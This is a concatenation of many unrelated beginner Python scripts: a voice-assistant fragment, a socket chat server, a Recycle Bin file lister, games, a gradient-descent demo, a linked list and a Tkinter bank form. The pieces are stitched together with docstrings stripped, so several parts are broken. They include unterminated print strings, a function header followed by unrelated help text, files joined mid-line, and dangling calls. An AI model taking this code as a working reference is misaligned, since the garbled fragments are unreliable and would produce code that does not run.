    elif Q=="Jokes":
        speak(pyjokes.get_joke())
    elif Q=="start recording":
        current.add('Win', 'Alt', 'r')
        speak("Started recording. just say stop recording to stop.")
    elif Q=="stop recording":
        current.add('Win', 'Alt', 'r')
        speak("Stopped recording. check your game bar folder for the video")
    elif Q=="clip that":
         current.add('Win', 'Alt', 'g')
         speak("Clipped. check you game bar file for the video")
         with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
              listener.join()
    else:
        engine.say("Sorry Try Again")
        engine.runAndWait()
    apps = {
    "time": datetime.now(),
    "notepad": "Notepad.exe",
    "calculator": "calc.exe",
    "stikynot": "StikyNot.exe",
    "shell": "powershell.exe",
    "paint": "mspaint.exe",
    "cmd": "cmd.exe",
    "browser": "C:\Program Files\Internet Explorer\iexplore.exe"
    }
    for app in apps:
        if app == Q.lower():
            subprocess.call([apps[app]])
            break
    else:
        engine.say("Sorry Try Again")
        engine.runAndWait()
    return
Jarvis(Query).get_app
import sys
class colors:
    CYAN = '\033[36m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    RED = '\033[31m'
    ENDC = '\033[0m'
def printc(color, message):
    print(color + message + colors.ENDC)
printc(colors.CYAN, sys.argv[1])
printc(colors.GREEN, sys.argv[1])
printc(colors.YELLOW, sys.argv[1])
printc(colors.BLUE, sys.argv[1])
printc(colors.RED, sys.argv[1])
list = []
num = int(input("Enter size of list: \t"))
for n in range(num):
    numbers = int(input("Enter any number: \t"))
    list.append(numbers)
x = int(input("\nEnter number to search: \t"))
found = False
for i in range(len(list)):
    if list[i] == x:
        found = True
        print("\n%d found at position %d" % (x, i))
        break
if not found:
    print("\n%d is not in list" % x)
from __future__ import print_function
import os  
from _winreg import *  
def sid2user(sid):  
    try:
        key = OpenKey(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" + "\\" + sid,
        )
        (value, type) = QueryValueEx(key, "ProfileImagePath")
        user = value.split("\\")[-1]
        return user
    except Exception:
        return sid
def returnDir():  
    dirs = ["c:\\Recycler\\", "C:\\Recycled\\", "C:\\$RECYCLE.BIN\\"]
    for recycleDir in dirs:
        if os.path.isdir(recycleDir):
            return recycleDir
    return None
def findRecycled(
    recycleDir,
):  
    dirList = os.listdir(recycleDir)
    for sid in dirList:
        files = os.listdir(recycleDir + sid)
        user = sid2user(sid)
        print("\n[*] Listing Files for User: " + str(user))
        for file in files:
            print("[+] Found File: " + str(file))
def main():
    recycleDir = returnDir()
    findRecycled(recycleDir)
if __name__ == "__main__":
    main()
import socket
import threading
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 1023))
print(socket.gethostname())
s.listen(5)
clients = []
nickename = []
def Client_Handler(cli):
    while True:
        try:
            reply = cli.recv(1024).decode("utf-8")
            if reply == "QUIT":
                index_of_cli = clients.index(cli)
                nick = nickename[index_of_cli]
                nickename.remove(nick)
                clients.remove(cli)
                BroadCasating(f"{nick} has left the chat room")
                print(f"Disconnected with f{nick}")
                break
            BroadCasating(reply)
        except Exception:
            index_of_cli = clients.index(cli)
            print(index_of_cli)
            nick = nickename[index_of_cli]
            nickename.remove(nick)
            clients.remove(cli)
            BroadCasating(f"{nick} has left the chat room")
            print(f"Disconnected with {nick}")
            break
def BroadCasating(msg):
    for client in clients:
        client.send(bytes(msg, "utf-8"))
def recieve():
    while True:
        client_sckt, addr = s.accept()
        print(f"Connection has been established {addr}")
        client_sckt.send(bytes("NICK", "utf-8"))
        nick = client_sckt.recv(1024).decode("utf-8")
        nickename.append(nick)
        clients.append(client_sckt)
        print(f"{nick} has joined the chat room ")
        BroadCasating(f"{nick} has joined the chat room say hi !!!")
        threading._start_new_thread(Client_Handler, (client_sckt,))
recieve()
s.close()
import random
import simplegui
def new_game():
    global num
    print("new game starts")
def range_of_100():
    global num
    num = random.randrange(0, 100)
    print("your range is 0-100")
def range_of_1000():
    global num
    num = random.randrange(0, 1000)
    print("Your range is 0-1000")
def input_guess(guess):
    global num
    print("Your Guess is ", guess)
    num1 = int(guess)
    if num1 == num:
        print("Correct")
    elif num1 >= num:
        print("Greater")
    elif num1 <= num:
        print("Lower")
frame = simplegui.create_frame("Guess The Number", 200, 200)
frame.add_button("range[0-1000)", range_of_1000)
frame.add_button("range[0-100)", range_of_100)
frame.add_input("enter your guess", input_guess, 200)
frame.start()
new_game()
print("\n
string = input("Enter a string: ").lower()
vowels = ["a", "e", "i", "o", "u"]
vowelscounter = 0
def checkVowels(letter):
    for i in range(len(vowels)):
        if letter == vowels[i]:
            return True
    return False
for i in range(len(string)):
    if checkVowels(string[i]):
        vowelscounter = vowelscounter + 1
print(f"\n
Introducing pandas using namespace pd,
such that you can call pandas class using pd instead of pandas.
Author : Mohit Kumar
Job Sequencing Problem implemented in python
        Assign jobs as instance of class Scheduling
        Parameteres  : total_jobs  and list of deadline of jobs
        Returns : List of jobs_id which are profitable  and can be done before
                  deadline
        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])
        >>> a.schedule( 3, [3, 4, 5])
        [(1, 2, 20), (2, 33, 30)]
        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])
        >>> a.schedule( 4, [13, 2, 33, 16])
        [(1, 2, 20), (2, 33, 30), (3, 16, 40)]
        Parameters : list of current profitable jobs within deadline
                     list of deadline of jobs
        Returns : true if k[-1] job is profitable to us else false
        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])
        >>> a.feasible( [0], [2, 13, 16, 33] )
        True
        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])
        >>> a.feasible([0], [2, 13, 16, 33] )
        True
for x in mails:
    counts[x]=counts.get(x,0)+1
bigmail=None
bigvalue=None
for key,value in counts.items():
    if bigvalue==None or bigvalue<value:
        bigmail=key
        bigvalue=value
print(bigmail, bigvalue)
Creates a sentence by selecting a word at randowm from each of the lists in
the following order: 'article', 'nounce', 'verb', 'preposition',
'article' and 'noun'.
The second part produce a short story consisting of several of
    return ("{} {} {} {} {} {}"
            .format(article[random_int()]
                    , noun[random_int()]
                    , verb[random_int()]
                    , preposition[random_int()]
                    , article[random_int()]
                    , noun[random_int()])).capitalize()
for sentence in list(map(lambda x: random_sentence(), range(0, 20))):
    print(sentence)
print("\n")
story = (". ").join(list(map(lambda x: random_sentence(), range(0, 20))))
print("{}".format(story))
import cv2
from utils import image_resize
cap = cv2.VideoCapture(0)
face_cascade = cv2.CascadeClassifier('face.xml')
nose_cascade = cv2.CascadeClassifier('Nose.xml')
mustache = cv2.imread('image/mustache.png', -1)
while (True):
    ret, frame = cap.read()
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    faces = face_cascade.detectMultiScale(
        gray, scaleFactor=1.5, minNeighbors=5)
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)
    for (x, y, w, h) in faces:
        roi_gray = gray[y:y + h, x:x + h]  
        roi_color = frame[y:y + h, x:x + h]
        nose = nose_cascade.detectMultiScale(
            roi_gray, scaleFactor=1.5, minNeighbors=5)
        for (nx, ny, nw, nh) in nose:
            roi_nose = roi_gray[ny: ny + nh, nx: nx + nw]
            mustache2 = image_resize(mustache.copy(), width=nw)
            mw, mh, mc = mustache2.shape
            for i in range(0, mw):
                for j in range(0, mh):
                    if mustache2[i, j][3] != 0:  
                        roi_color[ny + int(nh / 2.0) + i, nx +
                                  j] = mustache2[i, j]
    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
    cv2.imshow('frame', frame)
    if cv2.waitKey(20) & 0xFF == ord('x'):
        break
cap.release()
cv2.destroyAllWindows()
from appJar import gui
def press():
    bool = p.questionBox('Soru', 'Mesaj', parent=None)
    print(bool)
p = gui()
p.setSize(300,200)
p.addButton('Buton', press)
p.go()
import cv2
import pytesseract
img =cv2.imread('img.png')
img=cv2.cvtColor(img,cv2.COLOR_BGR2RGB)
hI,wI,k=img.shape
print(pytesseract.image_to_string(img))
boxes=pytesseract.image_to_boxes(img)
for b in boxes.splitlines():
    b=b.split(' ')
    x,y,w,h=int(b[1]),int(b[2]),int(b[3]),int(b[4])
    cv2.rectangle(img,(x,hI-y),(w,hI-h),(0,0,255),0.2)
cv2.imshow('img',img)
cv2.waitKey(0)
import random
import pyautogui
import string
chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
chars = string.printable
chars_list = list(chars)
password = pyautogui.password("Enter a password : ")
guess_password = ""
while(guess_password != password):
    guess_password = random.choices(chars_list, k=len(password))
    print("<=================="+ str(guess_password)+ "==================>")
    if(guess_password == list(password)):
        print("Your password is : "+ "".join(guess_password))
        break
import argparse
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--physics", help="physics marks")
    parser.add_argument("--chemistry", help="chemistry marks")
    parser.add_argument("--maths", help="maths marks")
    args = parser.parse_args()
    print(args.physics)
    print(args.chemistry)
    print(args.maths)
    print("Result:", (
        int(args.physics) + int(args.chemistry) + int(args.maths)
    ) / 3)
import socket
import time
soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
soc.bind((socket.gethostname(),2905))
soc.listen(5)
while True:
    clientsocket,addr = soc.accept()      
    print("estavlishes  a connection from %s" % str(addr))
    currentTime = time.ctime(time.time()) + "\r\n"
    clientsocket.send(currentTime.encode('ascii'))
    clientsocket.close()
import pyglet
class RectangleObject(pyglet.shapes.Rectangle):
    def __init__(self, *args, **kwargs):
        super(RectangleObject, self).__init__(*args, **kwargs)
def add_num(a,b):
	-c Followed by login password to connect
This module is used for generating a TF-IDF file or values from a list of files that contains docs.
What is TF-IDF : https://en.wikipedia.org/wiki/Tf%E2%80%93idf
python:
  - 3.5
pre-requisites: 
  - colorama==0.3.9 
sample file format of input:
    sport smile today because signs Gemini
    little sister dealt severe allergy figure
    about looks gender color attitude nationality respect
    added video playlist Sonic Fightstick Edition
    weeks birthday scott wants camping keeper
    photo taking photo trying auction scale photo
    happy creatively capture story stage magical
    yoongi looks seokjin looking yoongi looking seokjin
    taking glasses because buffering cannot handle
    tried Michelle Obama proceeded defend whole pointless
    robbed shades backstage reading guess karma stealing
    remains sailors destroyer McCain collision found
    timeline beginnings infographics Catch upcoming debut
here, every line represents a document.
have fun, cheers.
    --
    str : String to be modified.
    color : color code to which the string will be formed. default is 'r'=RED
    --
    str : final modified string with foreground color as per parameters.
    If you opt for dumping the data, you can provide a file_path with .tfidfpkl extension(standard made for better understanding)
    and also re-generate a new tfidf list which overrides over an old one by mentioning its path.
    --
    file_names : paths of files to be processed on, you can give many small sized file, rather than one large file.
    prev_file_path : path of old .tfidfpkl file, if available. (default=None)
    dump_path : directory-path where to dump generated lists.(default=None)
    --
    idf : a dict of unique words in corpus,with their document frequency as values.
    tf_idf : the generated tf-idf list of dictionaries for mentioned docs.
import numpy as np
import pandas as pd
from sklearn.linear_model import LinearRegression
import math
def predict_using_sklean():
    df = pd.read_csv("test_scores.csv")
    r = LinearRegression()
    r.fit(df[['math']],df.cs)
    return r.coef_, r.intercept_
def gradient_descent(x,y):
    m_curr = 0
    b_curr = 0
    iterations = 1000000
    n = len(x)
    learning_rate = 0.0002
    cost_previous = 0
    for i in range(iterations):
        y_predicted = m_curr * x + b_curr
        cost = (1/n)*sum([value**2 for value in (y-y_predicted)])
        md = -(2/n)*sum(x*(y-y_predicted))
        bd = -(2/n)*sum(y-y_predicted)
        m_curr = m_curr - learning_rate * md
        b_curr = b_curr - learning_rate * bd
        if math.isclose(cost, cost_previous, rel_tol=1e-20):
            break
        cost_previous = cost
        print ("m {}, b {}, cost {}, iteration {}".format(m_curr,b_curr,cost, i))
    return m_curr, b_curr
if __name__ == "__main__":
    df = pd.read_csv("test_scores.csv")
    x = np.array(df.math)
    y = np.array(df.cs)
    m, b = gradient_descent(x,y)
    print("Using gradient descent function: Coef {} Intercept {}".format(m, b))
    m_sklearn, b_sklearn = predict_using_sklean()
    print("Using sklearn: Coef {} Intercept {}".format(m_sklearn,b_sklearn))
import pyglet
from pyglet.window import key
from typing import Tuple
class Paddle(pyglet.shapes.Rectangle):
    def __init__(self, *args, **kwargs):
        super(Paddle, self).__init__(*args, **kwargs)
        self.acc_left, self.acc_right = 0.0, 0.0
        self.rightx = 0
        self.key_handler = key.KeyStateHandler()
        self.event_handlers = [self, self.key_handler]
    def update(self, win_size : Tuple, border : float, other_object, dt):
        newlx = self.x + self.acc_left
        newrx = self.x + self.acc_right
        if self.key_handler[key.LEFT]:
            self.x = newlx
        elif self.key_handler[key.RIGHT]:
            self.x = newrx
        self.rightx = self.x + self.width
        if self.x < border:
            self.x = border
            self.rightx = self.x + self.width
        elif self.rightx > win_size[0]-border:
            self.x = win_size[0]-border-self.width
            self.rightx = self.x + self.width
board = ["anything", 1, 2, 3, 4, 5, 6, 7, 8, 9]
switch = "p1"
j = 9
print("\n\t\t\tTIK-TAC-TOE")
def print_board():
    print("\n\n")
    print("    |     |")
    print("", board[1], " | ", board[2], " | ", board[3])
    print("____|_____|____")
    print("    |     |")
    print("", board[4], " | ", board[5], " | ", board[6])
    print("____|_____|____")
    print("    |     |")
    print("", board[7], " | ", board[8], " | ", board[9])
    print("    |     |")
def enter_number(p1_sign, p2_sign):
    global switch
    global j
    k = 9
    while (j):
        if k == 0:
            break
        if switch == "p1":
            p1_input = int(input("\nplayer 1 :- "))
            if p1_input <= 0:
                print("chose number from given board")
            else:
                for e in range(1, 10):
                    if board[e] == p1_input:
                        board[e] = p1_sign
                        print_board()
                        c = checkwin()
                        if c == 1:
                            print("\n\n Congratulation ! player 1 win ")
                            return
                        switch = "p2"
                        j -= 1
                        k -= 1
                        if k == 0:
                            print("\n\nGame is over")
                            break
        if k == 0:
            break
        if switch == "p2":
            p2_input = int(input("\nplayer 2 :- "))
            if p2_input <= 0:
                print("chose number from given board")
            else:
                for e in range(1, 10):
                    if board[e] == p2_input:
                        board[e] = p2_sign
                        print_board()
                        w = checkwin()
                        if w == 1:
                            print("\n\n Congratulation ! player 2 win")
                            return
                        switch = "p1"
                        j -= 1
                        k -= 1
def checkwin():
    if board[1] == board[2] == board[3]:
        return 1
    elif board[4] == board[5] == board[6]:
        return 1
    elif board[7] == board[8] == board[9]:
        return 1
    elif board[1] == board[4] == board[7]:
        return 1
    elif board[2] == board[5] == board[8]:
        return 1
    elif board[3] == board[6] == board[9]:
        return 1
    elif board[1] == board[5] == board[9]:
        return 1
    elif board[3] == board[5] == board[7]:
        return 1
    else:
        print("\n\nGame continue")
def play():
    print_board()
    p1_sign = input("\n\nplayer 1 chose your sign [0/x] = ")
    p2_sign = input("player 2 chose your sign [0/x] = ")
    enter_number(p1_sign, p2_sign)
    print("\n\n\t\t\tDeveloped By :- UTKARSH MATHUR")
if __name__ == "__main__":
    play()
def pigeonhole_sort(a): 
	my_min = min(a) 
	my_max = max(a) 
	size = my_max - my_min + 1
	holes = [0] * size 
	for x in a: 	
		holes[x - my_min] += 1
	i = 0
	for count in range(size): 
		while holes[count] > 0: 
			holes[count] -= 1
			a[i] = count + my_min 
			i += 1
a = [10, 3, 2, 7, 4, 6, 8] 
print(pigeonhole_sort(a) )
print(a)
import random
class Colour:
    BLACK = '\033[30m'
    RED = '\033[91m'
    GREEN = '\033[32m'
    END = '\033[0m'
suits = (Colour.RED +  'Hearts' + Colour.END, Colour.RED + 'Diamonds' + Colour.END, Colour.BLACK + 'Spades' + Colour.END, Colour.BLACK + 'Clubs' + Colour.END)
ranks = ('Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine', 'Ten', 'Jack', 'Queen', 'King', 'Ace')
values = {'Two': 2, 'Three': 3, 'Four': 4, 'Five': 5, 'Six': 6, 'Seven': 7, 'Eight': 8,
          'Nine': 9, 'Ten': 10, 'Jack': 10, 'Queen': 10, 'King': 10, 'Ace': 11}
playing = True
class Card:
    def __init__(self, suit, rank):
        self.suit = suit
        self.rank = rank
    def __str__(self):
        return self.rank + ' of ' + self.suit
class Deck:
    def __init__(self):
        self.deck = []
        for suit in suits:
            for rank in ranks:
                self.deck.append(Card(suit, rank))
    def __str__(self):
        deck_comp = ''
        for card in self.deck:
            deck_comp += '\n ' + card.__str__()
    def shuffle(self):
        random.shuffle(self.deck)
    def deal(self):
        single_card = self.deck.pop()
        return single_card
class Hand:
    def __init__(self):
        self.cards = []
        self.value = 0
        self.aces = 0  
    def add_card(self, card):
        self.cards.append(card)
        self.value += values[card.rank]
        if card.rank == 'Ace':
            self.aces += 1
    def adjust_for_ace(self):
        while self.value > 21 and self.aces:
            self.value -= 10
            self.aces -= 1
class Chips:
    def __init__(self):
        self.total = 100
        self.bet = 0
    def win_bet(self):
        self.total += self.bet
    def lose_bet(self):
        self.total -= self.bet
def take_bet(chips):
    while True:
        try:
            chips.bet = int(input('How many chips would you like to bet? '))
        except ValueError:
            print('Your bet must be an integer! Try again.')
        else:
            if chips.bet > chips.total or chips.bet <= 0:
                print(
                    "Your bet cannot exceed your balance and you have to enter a positive bet! Your current balance is: ",
                    chips.total)
            else:
                break
def hit(deck, hand):
    hand.add_card(deck.deal())
    hand.adjust_for_ace()
def hit_or_stand(deck, hand):
    global playing
    while True:
        x = input("Would you like to Hit or Stand? Enter '1' or '0' ")
        if x.lower() == '1':
            hit(deck, hand)
        elif x.lower() == '0':
            print("You chose to stand. Dealer will hit.")
            playing = False
        else:
            print("Wrong input, please try again.")
            continue
        break
def show_some(player, dealer):
    print("\nDealer's Hand:")
    print(" { hidden card }")
    print('', dealer.cards[1])
    print("\nYour Hand:", *player.cards, sep='\n ')
def show_all(player, dealer):
    print("\nDealer's Hand:", *dealer.cards, sep='\n ')
    print("Dealer's Hand =", dealer.value)
    print("\nYour Hand:", *player.cards, sep='\n ')
    print("Your Hand =", player.value)
def player_busts(player, dealer, chips):
    print("You are BUSTED !")
    chips.lose_bet()
def player_wins(player, dealer, chips):
    print("You are the winner!")
    chips.win_bet()
def dealer_busts(player, dealer, chips):
    print("Dealer has BUSTED !")
    chips.win_bet()
def dealer_wins(player, dealer, chips):
    print("Dealer is the winner!")
    chips.lose_bet()
def push(player, dealer):
    print("The match is tie !")
player_chips = Chips()
while True:
    print("\t              **********************************************************")
    print(
        "\t                       Welcome to the game Casino - BLACK JACK !                                                     ")
    print("\t              **********************************************************")
    print(Colour.BLACK + "\t                                   ***************")
    print("\t                                   * A           *")
    print("\t                                   *             *")
    print("\t                                   *      *      *")
    print("\t                                   *     ***     *")
    print("\t                                   *    *****    *")
    print("\t                                   *     ***     *")
    print("\t                                   *      *      *")
    print("\t                                   *             *")
    print("\t                                   *             *")
    print("\t                                   ***************" + Colour.END)
    print('\nRULES: Get as close to 21 as you can but if you get more than 21 you will lose!\n  Aces count as 1 or 11.')
    deck = Deck()
    deck.shuffle()
    player_hand = Hand()
    player_hand.add_card(deck.deal())
    player_hand.add_card(deck.deal())
    dealer_hand = Hand()
    dealer_hand.add_card(deck.deal())
    dealer_hand.add_card(deck.deal())
    take_bet(player_chips)
    show_some(player_hand, dealer_hand)
    while playing:
        hit_or_stand(deck, player_hand)
        show_some(player_hand, dealer_hand)
        if player_hand.value > 21:
            player_busts(player_hand, dealer_hand, player_chips)
            break
    if player_hand.value <= 21:
        while dealer_hand.value < 17:
            hit(deck, dealer_hand)
        show_all(player_hand, dealer_hand)
        if dealer_hand.value > 21:
            dealer_busts(player_hand, dealer_hand, player_chips)
        elif dealer_hand.value > player_hand.value:
            dealer_wins(player_hand, dealer_hand, player_chips)
        elif dealer_hand.value < player_hand.value:
            player_wins(player_hand, dealer_hand, player_chips)
        else:
            push(player_hand, dealer_hand)
    print("\nYour current balance stands at", player_chips.total)
    if player_chips.total > 0:
        new_game = input("Would you like to play another hand? Enter '1' or '0' ")
        if new_game.lower() == '1':
            playing = True
            continue
        else:
            print(
                "Thanks for playing!\n" + Colour.GREEN + "\t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n \t      Congratulations! You won " + str(player_chips.total) + " coins!\n\t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n " + Colour.END)
            break
    else:
        print(
            "Oops! You have bet all your chips and we are sorry you can't play more.\nThanks for playing! Do come again to Casino BLACK JACK!")
        break
from __future__ import print_function
import datetime  
import os  
import sys  
if len(sys.argv) < 3:
    print(text)
    sys.exit()
if '-h' in sys.argv or '--h' in sys.argv or '-help' in sys.argv or '--help' in sys.argv:
    print(text)
    sys.exit()
else:
    if '-python' in sys.argv[1]:
        config_file = "python.cfg"
        extension = ".py"
    elif '-bash' in sys.argv[1]:
        config_file = "bash.cfg"
        extension = ".bash"
    elif '-ksh' in sys.argv[1]:
        config_file = "ksh.cfg"
        extension = ".ksh"
    elif '-sql' in sys.argv[1]:
        config_file = "sql.cfg"
        extension = ".sql"
    else:
        print('Unknown option - ' + text)
        sys.exit()
confdir = os.getenv("my_config")
scripts = os.getenv("scripts")
dev_dir = "Development"
newfile = sys.argv[2]
output_file = (newfile + extension)
outputdir = os.path.join(scripts, dev_dir)
script = os.path.join(outputdir, output_file)
input_file = os.path.join(confdir, config_file)
old_text = " Script Name	: "
new_text = (" Script Name	: " + output_file)
if not (os.path.exists(outputdir)):
    os.mkdir(outputdir)
newscript = open(script, 'w')
input = open(input_file, 'r')
today = datetime.date.today()
old_date = " Created	:"
new_date = (" Created	: " + today.strftime("%d %B %Y"))
for line in input:
    line = line.replace(old_text, new_text)
    line = line.replace(old_date, new_date)
    newscript.write(line)
import os
confdir = os.getenv("my_config")  
conffile = 'env_check.conf'  
conffilename = os.path.join(confdir, conffile)  
for env_check in open(conffilename):  
    env_check = env_check.strip()  
    print('[{}]'.format(env_check))  
    newenv = os.getenv(
        env_check)  
    if newenv is None:  
        print(env_check, 'is not set')  
    else:  
        print('Current Setting for {}={}\n'.format(env_check, newenv))  
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None
class Linked_List:
    def __init__(self):
        self.head = None
    def Insert_At_Beginning(self, new_data):
        new_node = Node(new_data)
        new_node.next = self.head
        self.head = new_node
    def Insert_After(self, node, new_data):
        if node is None:
            return "Alert!, Node must be in Linked List"
        new_node = Node(new_data)
        new_node.next = node.next
        node.next = new_node
    def Insert_At_End(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        current = self.head
        while(current.next):
            current = current.next
        current.next = new_node
    def Display(self):
        temp = self.head
        while(temp):
            print(temp.data, "->", end=" ")
            temp = temp.next
        print("None")
if __name__ == "__main__":
    L_list = Linked_List()
    L_list.Insert_At_Beginning(1)
    L_list.Display()
    L_list.Insert_At_Beginning(2)
    L_list.Display()
    L_list.Insert_At_Beginning(3)
    L_list.Display()
    L_list.Insert_At_End(4)
    L_list.Display()
    L_list.Insert_At_End(5)
    L_list.Display()
    L_list.Insert_At_End(6)
    L_list.Display()
    L_list.Insert_After(L_list.head.next, 10)
    L_list.Display()from __future__ import print_function
import os
import shutil
import sys
EXT_VIDEO_LIST = ['FLV', 'WMV', 'MOV', 'MP4', 'MPEG', '3GP', 'MKV', 'AVI']
EXT_IMAGE_LIST = ['JPG', 'JPEG', 'GIF', 'PNG', 'SVG']
EXT_DOCUMENT_LIST = ['DOC', 'DOCX', 'PPT', 'PPTX', 'PAGES', 'PDF', 'ODT', 'ODP', 'XLSX', 'XLS', 'ODS', 'TXT', 'IN',
                     'OUT', 'MD']
EXT_MUSIC_LIST = ['MP3', 'WAV', 'WMA', 'MKA', 'AAC', 'MID', 'RA', 'RAM', 'RM', 'OGG']
EXT_CODE_LIST = ['CPP', 'RB', 'PY', 'HTML', 'CSS', 'JS']
EXT_EXECUTABLE_LIST = ['LNK', 'DEB', 'EXE', 'SH', 'BUNDLE']
EXT_COMPRESSED_LIST = ['RAR', 'JAR', 'ZIP', 'TAR', 'MAR', 'ISO', 'LZ', '7ZIP', 'TGZ', 'GZ', 'BZ2']
try:
    destLocation = str(sys.argv[1])
except IndexError:
    destLocation = str(input('Enter the Path of directory: '))
def ChangeDirectory(dir):
    try:
        os.chdir(dir)
    except WindowsError:
        print('Error! Cannot change the Directory')
        print('Enter a valid directory!')
        ChangeDirectory(str(input('Enter the Path of directory: ')))
ChangeDirectory(destLocation)
def Organize(dirs, name):
    try:
        os.mkdir(name)
        print('{} Folder Created'.format(name))
    except WindowsError:
        print('{} Folder Exist'.format(name))
    src = '{}\\{}'.format(destLocation, dirs)
    dest = '{}\{}'.format(destLocation, name)
    os.chdir(dest)
    shutil.move(src, '{}\\{}'.format(dest, dirs))
    print(os.getcwd())
    os.chdir(destLocation)
TYPES_LIST = ['Video', 'Images', 'Documents', 'Music', 'Codes', 'Executables', 'Compressed']
for dirs in os.listdir(os.getcwd()):
    if 1:
        for name, extensions_list in zip(TYPES_LIST, [EXT_VIDEO_LIST, EXT_IMAGE_LIST, EXT_DOCUMENT_LIST, EXT_MUSIC_LIST,
                                                      EXT_CODE_LIST, EXT_EXECUTABLE_LIST, EXT_COMPRESSED_LIST]):
            if dirs.split('.')[-1].upper() in extensions_list:
                Organize(dirs, name)
    else:
        if dirs not in TYPES_LIST:
            Organize(dirs, 'Folders')
print('Done Arranging Files and Folder in your specified directory')
street = "13 patli gali"
city = "New Delhi"
country = "India"
address = street + '\n' + city + '\n' + country
print("Address using + operator:",address)
address = f'{street}\n{city}\n{country}'
print("Address using f-string:",address)
s='Earth revolves around the sun'
print(s[6:14])
print(s[-3:])
num_fruits=10
num_veggies=5
print(f"I eat {num_veggies} veggies and {num_fruits} daily")
s='maine 200 banana khaye'
s=s.replace('banana','samosa')
s=s.replace('200','10')
print("Using two line replace:",s)
s='maine 200 banana khaye'
s=s.replace('banana','samosa').replace('200','10')
print("Using single line:",s)
import tkinter.messagebox
from tkinter import *
import backend
backend.connect_database()
def check_string_in_account_no(check_acc_no):
    r = check_acc_no.isdigit()
    return r
def create():
    def create_customer_in_database():
        def delete_create():
            create_employee_frame.grid_forget()
            page2()
        name = entry5.get()
        age = entry6.get()
        address = entry7.get()
        balance = entry8.get()
        acc_type = entry9.get()
        mobile_number = entry10.get()
        if len(name) != 0 and len(age) != 0 and len(address) != 0 and len(balance) != 0 and len(acc_type) != 0 and len(
                mobile_number) != 0:
            acc_no = backend.create_customer(name, age, address, balance, acc_type, mobile_number)
            label = Label(create_employee_frame, text='Your account number is {}'.format(acc_no))
            label.grid(row=14)
            button = Button(create_employee_frame, text="Exit", command=delete_create)
            button.grid(row=15)
        else:
            label = Label(create_employee_frame, text='Please fill all entries')
            label.grid(row=14)
            button = Button(create_employee_frame, text="Exit", command=delete_create)
            button.grid(row=15)
    frame1.grid_forget()
    global create_employee_frame
    create_employee_frame = Frame(tk, bg='black')
    create_employee_frame.grid(padx=500, pady=150)
    label = Label(create_employee_frame, text='Customer Detail', font='bold')
    label.grid(row=0, pady=4)
    label = Label(create_employee_frame, text='Name', font='bold')
    label.grid(row=1, pady=4)
    global entry5
    entry5 = Entry(create_employee_frame)
    entry5.grid(row=2, pady=4)
    label = Label(create_employee_frame, text='Age', font='bold')
    label.grid(row=3, pady=4)
    global entry6
    entry6 = Entry(create_employee_frame)
    entry6.grid(row=4, pady=4)
    label = Label(create_employee_frame, text='address', font='bold')
    label.grid(row=5, pady=4)
    global entry7
    entry7 = Entry(create_employee_frame)
    entry7.grid(row=6, pady=4)
    label = Label(create_employee_frame, text='Balance', font='bold')
    label.grid(row=7, pady=4)
    global entry8
    entry8 = Entry(create_employee_frame)
    entry8.grid(row=8, pady=4)
    label = Label(create_employee_frame, text='Account Type', font='bold')
    label.grid(row=9, pady=4)
    label = Label(create_employee_frame, text='Mobile number', font='bold')
    label.grid(row=11, pady=4)
    global entry9
    entry9 = Entry(create_employee_frame)
    entry9.grid(row=10, pady=4)
    global entry10
    entry10 = Entry(create_employee_frame)
    entry10.grid(row=12, pady=4)
    button = Button(create_employee_frame, text='Submit', command=create_customer_in_database)
    button.grid(row=13, pady=4)
    mainloop()
def search_acc():
    frame1.grid_forget()
    global search_frame
    search_frame = Frame(tk)
    search_frame.grid(padx=500, pady=300)
    label = Label(search_frame, text="Enter account number", font='bold')
    label.grid(row=0, pady=6)
    global entry11
    entry11 = Entry(search_frame)
    entry11.grid(row=1, pady=6)
    button = Button(search_frame, text="Search", command=show)
    button.grid(row=3)
    mainloop()
def show():
    def clear_show_frame():
        show_frame.grid_forget()
        page2()
    def back_page2():
        search_frame.grid_forget()
        page2()
    acc_no = entry11.get()
    r = check_string_in_account_no(acc_no)
    if len(acc_no) != 0 and r:
        details = backend.get_details(acc_no)
        if details != False:
            search_frame.grid_forget()
            global show_frame
            show_frame = Frame(tk)
            show_frame.grid(padx=400, pady=200)
            label = Label(show_frame, text="Account_number:\t{}".format(details[0]), font='bold')
            label.grid(row=0, pady=6)
            label = Label(show_frame, text="Name:\t{}".format(details[1]), font='bold')
            label.grid(row=1, pady=6)
            label = Label(show_frame, text="Age:\t{}".format(details[2]), font='bold')
            label.grid(row=2, pady=6)
            label = Label(show_frame, text="Address:\t{}".format(details[3]), font='bold')
            label.grid(row=3, pady=6)
            label = Label(show_frame, text="Balance:\t{}".format(details[4]), font='bold')
            label.grid(row=4, pady=6)
            label = Label(show_frame, text="Account_type:\t{}".format(details[5]), font='bold')
            label.grid(row=5, pady=6)
            label = Label(show_frame, text="Mobile Number:\t{}".format(details[6]), font='bold')
            label.grid(row=6, pady=6)
            button = Button(show_frame, text='Exit', command=clear_show_frame, width=20, height=2, bg='red', fg='white')
            button.grid(row=7, pady=6)
            mainloop()
        else:
            label = Label(search_frame, text="Account Not Found")
            label.grid()
